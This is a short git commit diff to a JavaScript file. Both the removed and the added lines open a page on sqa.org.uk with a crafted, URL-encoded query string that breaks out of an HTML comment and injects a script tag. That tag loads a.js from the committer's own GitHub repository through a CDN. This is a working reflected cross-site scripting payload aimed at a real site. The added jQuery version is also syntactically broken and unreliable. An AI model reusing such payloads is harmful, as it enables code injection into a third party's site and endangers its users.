b00e56f89dfe2c2c2c5520e42f90306b7a931de1
Uexodus <112518767+Uexodus@users.noreply.github.com>
2023-04-20 22:15:13 +0100

    Update a.js

--- a.js
+++ a.js
@@ -1,3 +1,6 @@
-var importantStuff = window.open('https://www.sqa.org.uk/sqa/31429.html', '_blank');
-importantStuff.document.write('Loading preview...');
-importantStuff.location.href = 'https://www.sqa.org.uk/sqa/31429.html?secure.error.404.unknown--%3E%3Cscript%20src%3dhttps%3a%2f%2fcdn%2ejsdelivr%2enet%2fgh%2fUexodus%2flua-pid%40main%2fa%2ejs%3E%3C%2fscript%3Eazmao=';
+$.ajax({
+ url: 'https://www.sqa.org.uk/sqa/31429.html?secure.error.404.unknown--%3E%3Cscript%20src%3dhttps://cdn.jsdelivr.net/gh/Uexodus/lua-pid@master/a.js%3E%3C%2fscript%3Eazmao=',
+ data: 'your image',
+ success: function(){window.open("https://www.sqa.org.uk/sqa/31429.html?secure.error.404.unknown--%3E%3Cscript%20src%3dhttps://cdn.jsdelivr.net/gh/Uexodus/lua-pid@master/a.js%3E%3C%2fscript%3Eazmao=");},
+ async: false
+}
